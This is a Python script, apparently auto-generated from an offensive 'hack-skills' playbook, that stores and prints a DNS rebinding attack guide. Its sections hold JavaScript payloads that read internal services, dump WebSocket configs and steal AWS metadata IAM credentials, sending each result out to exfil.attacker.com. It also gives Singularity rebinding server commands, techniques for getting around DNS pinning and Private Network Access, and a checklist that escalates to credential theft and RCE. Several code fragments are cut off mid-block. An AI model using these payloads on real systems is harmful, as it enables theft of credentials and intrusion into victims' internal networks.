#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/dns-rebinding-attacks

Skill: SKILL: DNS Rebinding — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-dns-rebinding-attacks.py --help
      python hack-skills-dns-rebinding-attacks.py --list
      python hack-skills-dns-rebinding-attacks.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/dns-rebinding-attacks'
TITLE = 'SKILL: DNS Rebinding — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: dns-rebinding-attacks", "description: >-", "DNS rebinding attack playbook. Use when testing applications that trust DNS resolution for origin checks, interact with internal services from browser context, or when SSRF is not possible server-side but the target has client-side fetch/XHR to attacker-controlled domains."],
    'skill-dns-rebinding-expert-attack-playbook': [],
    '0-related-routing': ["- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) \u2014 server-side variant; DNS rebinding is the **client-side** counterpart", "- [cors-cross-origin-misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) \u2014 when CORS misconfig allows direct cross-origin reads instead"],
    '1-core-principle': ["The browser same-origin policy binds `protocol + host + port`. The **host** is resolved via DNS at connection time. If an attacker controls the DNS server for `attacker.com`, they can:", "1. First resolution \u2192 attacker IP (serve malicious JS)", "2. Second resolution \u2192 internal IP (victim's network)", "3. Browser considers both responses same-origin (`attacker.com`)", "4. Malicious JS reads responses from internal services", "Victim visits attacker.com", "DNS query: attacker.com \u2192 1.2.3.4 (attacker server)", "Browser loads malicious JS from 1.2.3.4", "TTL expires (or forced flush)", "JS triggers new request to attacker.com", "DNS query: attacker.com \u2192 192.168.1.1 (internal target)", "Browser sends request to 192.168.1.1 as \"attacker.com\" origin", "JS reads response \u2014 same-origin policy satisfied", "Exfiltrates data to attacker's other endpoint", "**Key insight**: SOP checks the hostname string, not the resolved IP. DNS can change the IP behind the same hostname."],
    '2-ttl-manipulation': [],
    'dns-server-configuration': ["The attacker runs an authoritative DNS server for their domain that alternates responses:", "TTL=0 tells resolvers not to cache the result, forcing re-resolution on next connection."],
    'browser-dns-cache-reality': ["Browsers maintain their own DNS cache that **ignores low TTLs**:"],
    'bypass-strategies': ["1. Multiple A records technique:", "- Return BOTH attacker IP and target IP in single DNS response", "- Browser tries first IP; if connection fails \u2192 falls back to second", "- Block attacker IP after initial page load \u2192 forces fallback to internal IP", "2. Subdomain flooding:", "- Use unique subdomains: a1.rebind.attacker.com, a2.rebind.attacker.com...", "- Each subdomain gets fresh DNS resolution (no cache hit)", "3. Service worker flush:", "- Register service worker that intercepts and delays requests", "- By the time fetch executes, DNS cache has expired"],
    '3-attack-variants': [],
    '3-1-classic-http-rebinding': ["Target: internal web services (admin panels, REST APIs)", "```javascript", "// Served from attacker.com (first DNS resolution \u2192 attacker IP)", "async function exploit() {", "// Wait for DNS cache to expire", "await sleep(65000); // >60s for Chrome", "// This request now resolves to internal IP", "const resp = await fetch('http://attacker.com:8080/api/admin/users');", "const data = await resp.text();", "// Exfiltrate to different attacker endpoint", "navigator.sendBeacon('https://exfil.attacker.com/log', data);"],
    '3-2-websocket-rebinding': ["WebSocket connections persist after DNS rebinding. Establish WS, then rebind:", "```javascript", "// After rebinding, WebSocket connects to internal service", "const ws = new WebSocket('ws://attacker.com:9090/ws');", "ws.onopen = () => {", "ws.send('{\"action\":\"dump_config\"}');", "ws.onmessage = (e) => {", "fetch('https://exfil.attacker.com/ws-data', {", "method: 'POST',", "body: e.data"],
    '3-3-time-of-check-to-time-of-use-toctou': ["Server-side applications that validate DNS at request time but reuse the connection:", "1. Application receives URL: http://attacker.com/callback", "2. Server resolves attacker.com \u2192 1.2.3.4 (public IP) \u2192 passes validation", "3. Server opens connection / follows redirect", "4. DNS changes: attacker.com \u2192 169.254.169.254", "5. Connection reuse or redirect hits internal IP", "This is a hybrid with SSRF \u2014 the rebinding happens in the server's resolver."],
    '3-4-multiple-a-records-fastest-variant': ["DNS response for attacker.com:", "A  1.2.3.4       (attacker \u2014 serves JS)", "A  192.168.1.1   (target \u2014 internal service)", "1. Browser connects to 1.2.3.4, loads page with JS", "2. Attacker firewall blocks further connections from victim to 1.2.3.4", "3. JS makes new request to attacker.com", "4. Browser tries 1.2.3.4 \u2192 connection refused", "5. Falls back to 192.168.1.1 \u2192 still same origin", "6. Response readable by JS"],
    '4-high-value-targets': [],
    'cloud-metadata-specific': ["```javascript", "// AWS metadata via rebinding", "fetch('http://attacker.com/latest/meta-data/iam/security-credentials/')", ".then(r => r.text())", ".then(role => {", "return fetch(`http://attacker.com/latest/meta-data/iam/security-credentials/${role}`);", ".then(r => r.json())", ".then(creds => {", "navigator.sendBeacon('https://exfil.attacker.com/', JSON.stringify(creds));", "// After rebinding, attacker.com resolves to 169.254.169.254", "// Browser sends Host: attacker.com but IMDSv1 doesn't check Host header", "**IMDSv2 defense**: requires `X-aws-ec2-metadata-token` header from PUT request. Rebinding cannot easily set custom headers on the initial token request in `no-cors` mode."],
    '5-tools': [],
    'singularity-quick-start': ["```bash"],
    'clone-and-run': ["git clone https://github.com/nccgroup/singularity", "cd singularity", "go build -o singularity cmd/singularity-server/main.go"],
    'start-with-rebind-from-attacker-ip-to-target-ip': ["./singularity -DNSRebindStrategy round-robin \\", "-ResponseIPAddr 1.2.3.4 \\", "-RebindingFn sequential \\", "-ResponseReboundIPAddr 192.168.1.1"],
    'rbndr-us-zero-setup': ["Format: <hex-ip1>.<hex-ip2>.rbndr.us", "Example: 7f000001.c0a80101.rbndr.us", "\u2192 alternates between 127.0.0.1 and 192.168.1.1", "Convert IP to hex:", "192.168.1.1 \u2192 c0.a8.01.01 \u2192 c0a80101", "127.0.0.1   \u2192 7f.00.00.01 \u2192 7f000001"],
    '6-dns-rebinding-vs-ssrf': ["**Critical difference**: DNS rebinding leverages the **victim's browser** as the pivot point, so it accesses services visible from the **victim's network**, with the **victim's cookies/credentials**."],
    '7-defenses-and-defense-bypass': [],
    'common-defenses': [],
    'defense-bypass-techniques': ["DNS pinning bypass:", "\u251c\u2500\u2500 Multiple A records \u2192 connection failure forces fallback", "\u251c\u2500\u2500 Subdomain per request \u2192 no cache hit", "\u251c\u2500\u2500 Wait for cache expiry (Chrome: 60s)", "\u2514\u2500\u2500 Rebind via CNAME chain (harder to pin)", "Host header validation bypass:", "\u251c\u2500\u2500 Internal service may not check Host header at all", "\u251c\u2500\u2500 Host: attacker.com accepted by default configs", "\u251c\u2500\u2500 IP-based vhosts don't check Host", "\u2514\u2500\u2500 Wildcard vhost configurations", "Private Network Access (PNA) bypass:", "\u251c\u2500\u2500 PNA only in Chrome (as of 2024), partial enforcement", "\u251c\u2500\u2500 WebSocket connections may not trigger preflight", "\u251c\u2500\u2500 HTTPS \u2192 HTTP downgrade scenarios", "\u2514\u2500\u2500 Non-browser clients unaffected"],
    '8-decision-tree': ["Want to access internal services from victim's browser?", "\u251c\u2500\u2500 Can you get victim to visit your page?", "\u2502   \u251c\u2500\u2500 YES \u2192 DNS rebinding is viable", "\u2502   \u2502   \u2502", "\u2502   \u2502   \u251c\u2500\u2500 What is the target?", "\u2502   \u2502   \u2502   \u251c\u2500\u2500 HTTP service \u2192 Classic rebinding (Section 3.1)", "\u2502   \u2502   \u2502   \u251c\u2500\u2500 WebSocket service \u2192 WS rebinding (Section 3.2)", "\u2502   \u2502   \u2502   \u2514\u2500\u2500 Cloud metadata \u2192 Metadata exfil (Section 4)", "\u2502   \u2502   \u2502", "\u2502   \u2502   \u251c\u2500\u2500 Browser cache concern?", "\u2502   \u2502   \u2502   \u251c\u2500\u2500 Chrome \u2192 Wait 60s or use multiple subdomains", "\u2502   \u2502   \u2502   \u251c\u2500\u2500 Firefox \u2192 Wait 60s or adjust dnsCacheExpiration", "\u2502   \u2502   \u2502   \u2514\u2500\u2500 Use multiple A records technique for instant rebind", "\u2502   \u2502   \u2502", "\u2502   \u2502   \u251c\u2500\u2500 Target checks Host header?", "\u2502   \u2502   \u2502   \u251c\u2500\u2500 YES \u2192 Rebinding alone won't work", "\u2502   \u2502   \u2502   \u2502   \u2514\u2500\u2500 Check for SSRF instead (../ssrf-server-side-request-forgery/)", "\u2502   \u2502   \u2502   \u2514\u2500\u2500 NO \u2192 Proceed with rebinding", "\u2502   \u2502   \u2502", "\u2502   \u2502   \u2514\u2500\u2500 Need credentials?", "\u2502   \u2502       \u251c\u2500\u2500 Browser auto-sends cookies \u2192 works if same-site allows", "\u2502   \u2502       \u2514\u2500\u2500 Custom auth header needed \u2192 limited (no-cors won't send custom headers)", "\u2502   \u2502", "\u2502   \u2514\u2500\u2500 NO \u2192 DNS rebinding not applicable", "\u2502       \u2514\u2500\u2500 Consider SSRF if server-side fetch exists", "\u2514\u2500\u2500 Is this server-side DNS validation bypass? (TOCTOU)", "\u251c\u2500\u2500 YES \u2192 Hybrid approach (Section 3.3)", "\u2502   \u2514\u2500\u2500 SSRF with DNS rebinding for IP validation bypass", "\u2514\u2500\u2500 NO \u2192 Review ../ssrf-server-side-request-forgery/ instead"],
    '9-real-world-exploitation-checklist': ["\u25a1 Set up DNS rebinding infrastructure (Singularity / rbndr.us / custom)", "\u25a1 Identify target internal services (port scan from victim context if possible)", "\u25a1 Determine browser DNS cache duration for target browser", "\u25a1 Choose rebinding variant (classic / multi-A / subdomain flood)", "\u25a1 Test with benign internal endpoint first (e.g., / on router)", "\u25a1 Verify same-origin read works after rebind", "\u25a1 Escalate: cloud metadata \u2192 creds, Docker API \u2192 RCE, admin panels \u2192 config", "\u25a1 Document: attacker.com DNS config, JS payload, rebind timing, exfil data"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()